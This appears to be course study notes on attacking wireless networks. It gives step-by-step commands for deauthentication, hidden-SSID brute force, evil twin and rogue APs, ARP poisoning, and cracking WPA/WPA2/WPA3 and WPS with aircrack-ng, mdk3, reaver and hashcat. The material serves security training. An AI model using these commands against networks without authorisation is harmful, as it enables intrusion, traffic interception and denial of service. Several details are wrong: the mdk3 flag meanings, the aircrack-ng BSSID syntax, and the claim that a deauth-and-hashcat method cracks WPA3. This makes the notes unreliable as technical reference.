## 1. Wi-Fi Discovery & Footprinting

The first step is finding the target network/device by locating the BSS and identifying the SSID.

### Discovery Methods:
* **Passive Footprinting:** Detecting an AP by sniffing packets from the airwaves without injecting data or attempting connections. Discloses devices, APs, and SSIDs.
* **Active Footprinting:** The attacker's device sends a probe request with an empty SSID to the AP. The AP responds with its own SSID in a probe response packet.

### Wi-Fi Chalking Techniques
* **WarWalking:** Walking with Wi-Fi-enabled laptops to map open networks.
* **WarChalking:** Drawing symbols in public places to advertise open networks.
* **WarFlying:** Using drones to detect open wireless networks.
* **WarDriving:** Driving around with Wi-Fi-enabled laptops to map networks.

### Discovery Tools
* **inSSIDer:** Optimization/troubleshooting tool. Highlights APs, tracks dBm over time, exports GPS data to KML for Google Earth, and shows overlapping channels.
* **Sparrow-wifi:** GUI-based 2.4/5GHz spectral awareness tool. Integrates HackRF, Ubertooth, and GPS to perform source hunting and spectrum analysis.
* **Mobile Tools:** WiFi Analyzer, Opensignal, Network Signal Info Pro, WiFiman.

### Finding WPS-Enabled APs (`wash`)
The `wash` command-line utility identifies WPS-enabled APs and checks if they are locked.
**Syntax:** `wash -i <interface>`
**Example:** `sudo wash -i wlan0` or `wash -i mon0`
**Arguments:**
* `-i`, `--interface=<iface>`: Specifies the interface to capture packets.
* `-a`, `--all`: Displays all access points, including those with WPS disabled.
* `-f`, `--file [FILE1 FILE2 FILE3 ...]`: Reads packets from captured files.
* `-c`, `--channel=<num>`: Specifies the channel to listen [auto].
* `-o`, `--out-file=<file>`: Writes data to a file.
* `-n`, `--probes=<num>`: Specifies maximum number of probes to send to each AP in the scan mode.
* `-D`, `--daemonize`: Wash command.
* `-5`, `--5ghz`: Command to use 5 GHz 802.11 channels.
* `-s`, `--scan`: Command to run in the scan mode.
* `-u`, `--survey`: Command to use the survey mode [default].

## 2. Wireless Traffic Analysis

Traffic analysis determines the broadcasted SSID, multiple APs, authentication methods, and encryption. Tools use the "monitor mode" to capture packets.

### Traffic Analysis Tools
* **Wireshark:** Uses `Npcap` to capture massive amounts of management/control/data frames. Helps analyze Radiotap header fields.
* **CommView for Wi-Fi:** Displays per-node/per-channel statistics. Can decrypt packets with user-defined WPA-PSK keys.
* **Other Tools:** AirMagnet G3 Pro, Riverbed Packet Analyzer, OmniPeek, Kismet.

## 3. Launch of Wireless Attacks

### The Aircrack-ng Suite
| Tool | Description |
| :--- | :--- |
| **airbase-ng** | Captures WPA/WPA2 handshakes; acts as an ad-hoc AP. |
| **aircrack-ng** | De facto WEP and WPA/WPA2 PSK cracking tool. |
| **airdecap-ng** | Decrypts packets; strips wireless headers. |
| **airdrop-ng** | Targeted, rule-based de-authentication of users. |
| **aireplay-ng** | Gathers IVs and handshakes via packet injection. |
| **airgraph-ng** | Creates client–AP relationship graphs from an airodump file. |
| **airmon-ng** | Switches interface between managed and monitor mode. |
| **airodump-ng** | Captures raw 802.11 frames and collects WEP IVs. |
| **airolib-ng** | Stores and manages ESSID and password lists. |
| **airtun-ng** | Creates a virtual tunnel interface to monitor encrypted traffic. |

### Detecting Hidden SSIDs
Organizations hide SSIDs (security through obscurity), but attackers reveal them:
1. `airmon-ng start <Wireless interface>` (e.g., `airmon-ng start wlan0`)
   *(Note: If any process causes trouble, first run `airmon-ng check kill`)*
2. `airodump-ng <Wireless Interface>` (e.g., `airodump-ng wlan0mon`)
3. Brute force the SSID using **mdk3**:
   **Syntax:** `mdk3 <Wireless Interface> p -b 1 -c <Channel> -t <Target BSSID>`
   **Example:** `mdk3 wlan0mon p -b 1 -c 2 -t 1C:3B:F3:40:10:74`
   *(p: Basic probing and ESSID Brute-force mode, -b: Beacon flood mode, 1: EAPOL logoff test, -c: Selection channel, -t: Target BSSID)*

### Denial-of-Service Attacks
* **Disassociation:** Destroys connectivity between AP and client.
* **De-authentication:** Floods stations with forged de-authenticates.

### MITM Attack Using Aircrack-ng
1. `airmon-ng start eth1`
2. `airodump-ng --ivs --write capture eth1`
3. De-authenticate client: `aireplay-ng -0 5 -a 02:24:2B:CD:68:EE`
4. Associate wireless card: `aireplay-ng -1 0 -e SECRET_SSID -a [MAC] -h [MAC] eth1`

### MAC Spoofing Attack
Bypasses MAC filtering by spoofing an authorized user's MAC address.
* **Linux:** `ifconfig wlan0 down` -> `ifconfig wlan0 hw ether <new MAC>` (e.g., `ifconfig wlan0 hw ether 02:25:ab:4c:2a:bc`) -> `ifconfig wlan0 up`
* **Windows Tool:** Technitium MAC Address Changer.

### ARP Poisoning Using Ettercap
Corrupts the ARP cache with wrong MAC addresses to perform MITM.
1. Launch Ettercap GUI -> Sniff -> Unified Sniffing.
2. Setup interface -> Scan for Hosts -> Hosts List.
3. Select targets -> MITM -> ARP Poisoning -> "Sniff remote connections".

### Rogue AP & Evil Twin Setup
* **Rogue AP (MANA Toolkit):** Modify `hostapd-mana.conf` with a fake SSID ("Free Internet"). Execute the script: `bash <Path to MANA>/mana-toolkit/run-mana/start-nat-simple.sh`. The attacker routes victim traffic to capture data.
* **Evil Twin:** Configure laptop with Internet Connection Sharing. Use tools like **KARMA** to listen to probe requests and broadcast the SSID the client is looking for.

## 4. Advanced Wireless Attacks

### KRACK Attack
Exploits the 4-way handshake of WPA2 by forcing **Nonce reuse**. The attacker captures the victim’s ANonce key and replays cryptographic handshake messages to steal credit cards, passwords, etc.

### Jamming Signal Attack
Overwhelming volumes of malicious traffic obstruct legitimate traffic (Layer 1 DoS).
* **Hardware:** PCB-4510 Jammer (50-150m, 10 antennas), CPB-2920 (20 antennas), CPB-2612H-5G.

### aLTEr Attack (LTE / 4G Hijacking)
Targeted at LTE devices encrypting in AES-CTR mode (no integrity protection). Uses a fake virtual tower.
1. **Information Gathering:** Identity mapping, Website fingerprinting (tracking traffic volume/meta info).
2. **Attack Phase:** DNS spoofing via the fake tower redirects victims to malicious websites to steal credentials.

### Wi-Jacking Attack
Cracks WPA/WPA2 without a handshake by targeting saved browser credentials for the router's admin interface (HTTP).
1. `aireplay-ng` to de-authenticate the victim.
2. Use **KARMA** (`hostapd-wpe`) to lure the victim to a malicious network.
3. Use `dnsmasq` to inject a malicious URL.
4. When the router restarts, the browser automatically authenticates via `XMLHttpRequest` to steal the WPA2 PSK.

### RFID Cloning
Copying data from a legitimate RFID tag to a new chip using tools like **iCopy-X**, **RFIDler**, or **Flipper Zero**.

## 5. Wi-Fi Encryption Cracking

### Cracking WPA/WPA2 Using Aircrack-ng
Captures the 4-way handshake via a de-authentication attack, then cracks it offline using a dictionary.
1. Start monitor mode: `airmon-ng start <wireless interface>` (e.g., `airmon-ng start wlan0`)
   *(Note: Run `airmon-ng check kill` if an error saying finds two processes that could cause trouble occurs)*
2. Discover APs: `airodump-ng <Wireless Interface>` (e.g., `airodump-ng wlan0mon`)
3. Capture packets: `airodump-ng --bssid <BSSID> -c 1 -w <ESSID> <Wireless interface>`
   (e.g., `airodump-ng --bssid [MAC] -c 1 -w ECCLabs wlan0mon`)
4. De-authenticate client (forces handshake):
   `aireplay-ng -0 11 -a <Access point MAC address/BSSID> -c <MAC address of connected device> <Wireless interface>`
   (e.g., `aireplay-ng -0 11 -a [AP MAC] -c [Client MAC] wlan0mon`)
5. Crack the handshake:
   `aircrack-ng -a2 <Access point MAC address/BSSID> -w password.txt <captured file name>.cap`
   (e.g., `aircrack-ng -a2 [AP MAC] -w password.txt ECCLabs-01.cap`)

### WPA Brute Forcing Using Fern Wi-Fi Cracker
Python-based GUI auditing tool:
1. Run `sudo fern-wifi-cracker`.
2. Enable Monitor Mode.
3. Scan for Access Points.
4. Initiate de-authentication attack to capture the handshake.
5. Select a wordlist (e.g., `rockyou.txt`).
6. Click "Start WPA Attack".

### WPA3 Encryption Cracking
WPA3 uses the Dragonfly (SAE) handshake, preventing offline brute-force. However, vulnerabilities (Dragonblood) exist:
* **Downgrade Security Attacks:** Force the user to connect using WPA2 by exploiting backward compatibility or by pretending the AP does not support WPA3.
* **Side-Channel Attacks:**
  * **Timing-based:** Analyzing the time taken by the Dragonfly handshake to encode auth processes to short-list passwords.
  * **Cache-based:** Injecting malicious JavaScript into the browser to observe memory access patterns.

**Cracking WPA3 using hcxtools & hashcat:**
1. Monitor mode: `airmon-ng start <Wireless_Interface>` (e.g., `airmon-ng start wlan0`)
2. Capture traffic: `airodump-ng wlan0mon`
   Alternatively, focus on a target network: `airodump-ng --bssid <BSSID> --channel <CH> --write capture wlan0mon`
3. De-authenticate: `aireplay-ng --deauth 10 -a <BSSID> -c <Client_MAC> wlan0mon`
4. Convert `.cap` to `.hccapx` format:
   `hcxpcapngtool -o capture.hccapx <capture>.cap`
5. Crack with hashcat:
   `hashcat -m 22000 capture.hccapx </path/to/wordlist.txt>`

### Cracking WPS Using Reaver
Reaver recovers WPA/WPA2 passphrases by exploiting WPS registrar PINs.
1. Monitor mode: `airmon-ng <start|stop> <interface>` (e.g., `airmon-ng start wlan0`)
2. Detect WPS-enabled devices: `wash -i <interface>` (e.g., `wash -i mon0`)
3. If wash fails, use: `airodump-ng <interface>` (e.g., `airodump-ng wlan0mon`)
4. Crack the WPS PIN:
   **Syntax:** `reaver -i <monitor-mode interface> -b <BSSID of target AP> -vv <Display non-critical warnings>`
   **Example:** `reaver -i wlan0mon -b B4:75:0E:89:00:60 -vv`
